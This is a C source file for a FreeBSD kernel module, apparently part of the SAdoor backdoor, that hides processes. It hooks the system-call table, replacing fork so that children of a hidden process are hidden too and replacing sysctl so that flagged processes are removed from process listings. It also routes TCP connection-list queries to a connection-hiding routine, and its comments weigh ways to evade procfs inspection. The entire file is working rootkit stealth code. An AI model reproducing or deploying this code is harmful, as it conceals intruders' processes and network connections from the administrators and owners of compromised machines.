/*
 *  File: hide_module.c
 *  Author: Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  Description: Process hiding routines
 *  Version: 1.0
 *  Date: Thu Jul 24 11:41:39 CEST 2003
 *
 *  Copyright (c) 2003 Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  All rights reserved, all wrongs reversed.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met: 
 *
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *  3. The name of author may not be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 *
 *  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 *  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 *  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 *  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 *  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 *  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 *  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 *  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 *  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */     

#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/sysproto.h>
#include <sys/sysctl.h>
#include <sys/syscall.h>
#include <sys/sysent.h>
#include <sys/unistd.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/user.h> /* for struct kinfo_proc */
#include <sys/socket.h>

#include "sadoor.h"
#include "stealth.h"

#include <sys/socketvar.h>
#include <netinet/in_pcb.h>
#include <netinet/tcp.h>
#include <netinet/tcp_var.h>


#ifdef SAKMOD_HIDE_PROCS


/* New functions */
static int hide_procs_fork(struct thread *, void *);
static int hide_procs_sysctl(struct thread *, void *);

/* Saved function pointers */
static sy_call_t *saved_fork_sycall;
static sy_call_t *saved_sysctl_sycall;

/*
 * Hide processes.
 * o Replaces SYS_fork to make children inherit the hidden flag.
 * o Replaces SYS__sysctl to be able to filter out hidden processes.
 *
 * Note that information about a hidden process is accessible from
 * within the process file system (procfs, normaly mounted on /proc)
 * (not to mention /dev/kmem ..).
 * 
 * One way to "solve" this is to patch getdirentries() against
 * access to directories with a hidden pid. 
 * This is not a good solution since all one have to do is to
 * create a set of directories and try to access them in order 
 * to reveal a hidden process, or worse, imagine that the database 
 * running creates a directory with the same name as a hidden pid, 
 * things will get broken, and that is not what we want. :-)
 *
 * One could of course patch procfs_lookup() against access to a
 * directory with a hidden pid, but it will not hide the directory
 * from a stat() (ls(1)).
 *
 * One will have to know where procfs is mounted and focus on 
 * sub directories with the name of hidden pids there, and only 
 * there to be able to hide processes without interfering with
 * the rest of the system and sucessfully hide the processes.
 *
 * Since the process filesystem is not mounted by default on 
 * FreeBSD, I leave this as an exercise for the really paranoid
 * SAdoor user.
 */
void
hide_procs(void)
{
    int s;

    splhigh();

        /* Save and replace SYS_fork */
        debug(3, "Replacing fork\n");
        saved_fork_sycall = sysent[SYS_fork].sy_call;
        sysent[SYS_fork].sy_call = hide_procs_fork;

        /* Save and replace SYS___sysctl */
        debug(3, "Replacing sysctl\n");
        saved_sysctl_sycall = sysent[SYS___sysctl].sy_call;
        sysent[SYS___sysctl].sy_call = hide_procs_sysctl;

    splx(s);
}

/*
 * Restore the replaced functions
 */
void
hide_procs_restore(void)
{
    int s;

    splhigh();
        
        /* Restore SYS_fork */
        debug(3, "Restoring fork\n");
        sysent[SYS_fork].sy_call = saved_fork_sycall;

        /* Restore sysctl */
        debug(3, "Restoring sysctl\n");
        sysent[SYS___sysctl].sy_call = saved_sysctl_sycall;    

    splx(s);
}

/*
 * The new fork syscall
 * Add the hidden flag to the child if the parent is hidden.
 */
static int
hide_procs_fork(struct thread *td, void *dummy)
{
    int error;
    struct proc *p2;
 
    mtx_lock(&Giant);
    error = fork1(td, RFFDG | RFPROC, 0, &p2);
    if (error == 0) {
        td->td_retval[0] = p2->p_pid;
        td->td_retval[1] = 0;

        /* Add hidden flag */
        if (td->td_proc->p_flag & SAKMOD_HIDDEN_PROC_FLAG) {
            debug(3, "Hiding child process %d\n", p2->p_pid);
            p2->p_flag |= SAKMOD_HIDDEN_PROC_FLAG;
        }
    }
    mtx_unlock(&Giant);
    return error;
}

/*
 * The new sysent syscall.
 * Let the real sysctl function handle the request and 
 * filter out all hidden processes in the answer.
 */
static int
hide_procs_sysctl(struct thread *td, void *arg)
{
    struct sysctl_args *uap;
    int mib[4];
    struct kinfo_proc kpr;    /* Kernel space variable for the returned structure(s) */
    size_t size;            /* Size to return */
    int retval;                /* Return value from real sysctl function */
    int i;
    
    /* Call the real sysctl function */
    if ( (retval = saved_sysctl_sycall(td, arg))) {
        debug(3, "hide_procs_sysctl(): Real sysctl returned error (%d)\n", retval);
        return(retval);
    }
    uap = (struct sysctl_args *)arg;

    /* Copy mib from userspace */
    copyin(uap->name, mib, sizeof(mib));

    /* If connections should be hidden, this is the new __sysctl funtion,
     * so just pass everything on */
#ifdef SAKMOD_HIDE_CONNECTION
    if ((mib[0] == CTL_NET) && (mib[1] == PF_INET) && 
            (mib[2] == IPPROTO_TCP) && (mib[3] == TCPCTL_PCBLIST))
        return(hide_conns_sysctl(td, arg));
#endif /* SAKMOD_HIDE_CONNECTION */

    /* No need to continue if it's not a process request */
    if ((mib[0] != CTL_KERN) || (mib[1] != KERN_PROC))
        return(retval);

#ifdef SAKMOD_UNHIDE_FOR_HIDDEN_PROC
    /* If the request came from a hidden process, do not hide anything */
    if (td->td_proc->p_flag & SAKMOD_HIDDEN_PROC_FLAG) {
        debug(2, "hide_procs_sysctl(): Request from hidden process, returning all\n");
        return(retval);
    }
#endif /* SAKMOD_UNHIDE_FOR_HIDDEN_PROC */

    /* Request for information about a specific process */
    if ((mib[2] == KERN_PROC_PID) || (mib[2] == KERN_PROC_ARGS)) {
        
        /* In this case, it's a request for the size only (to allocate memory),
         * the "real" request is performed later, and if the process is hidden
         * zero is returned */
        if (uap->old == NULL) {
            debug(3, "Request for single process, but uap->old is NULL\n");
            return(0);
        }

        /* Copy to kernel space */
        copyin(uap->old, &kpr, sizeof(kpr));

        /* Is the requested process hidden? */
        if (kpr.ki_flag & SAKMOD_HIDDEN_PROC_FLAG) {
            debug(2, "Request for hidden process (%d), returning zero size\n", 
                kpr.ki_pid);
    
            /* Return size of zero (no such process) */
            size = 0;
            copyout(&size, uap->oldlenp, sizeof(size));
            return(0);
        }
        /* We are done here, hand over the process information */
        else 
            return(0);
    }
    /* Request for a block of processes:
     * KERN_PROC_ALL - Everything
     * KERN_PROC_PGRP - by process group id
     * KERN_PROC_SESSION - by session of pid
     * KERN_PROC_TTY - by controlling tty
     * KERN_PROC_UID - by effective uid
     * KERN_PROC_RUID - by real uid */
    else {

        /* Get the returned size */
        copyin(uap->oldlenp, &size, sizeof(size));

        /* Remove the hidden processes from the array
         * and decrease the size */
        if (uap->old != NULL) {

            debug(2, "Got %u processes in response from real sysctl\n", 
                size/(u_int)sizeof(kpr));

            for (i=0; i*sizeof(kpr) < size; i++) {
                copyin((u_char *)uap->old + i*sizeof(kpr), &kpr, sizeof(kpr));
    
                /* Decrement size and overlap if the process is hidden */
                if (kpr.ki_flag & SAKMOD_HIDDEN_PROC_FLAG) {
                    debug(2, "Found hidden process in response (%d)\n", kpr.ki_pid);

                    bcopy((u_char *)uap->old+(i+1)*sizeof(kpr), 
                        (u_char *)uap->old+i*sizeof(kpr), size-(i+1)*sizeof(kpr));
                    
                    size -= sizeof(kpr);
                    
                    /* We don't want to miss the process used to overlap
                     * the hidden one */
                    i--;
                }
    
            }

            /* Set the new size and return */
            copyout(&size, uap->oldlenp, sizeof(size));
            return(0);
        }
    }

    return(retval);
}

#endif /* SAKMOD_HIDE_PROCS */
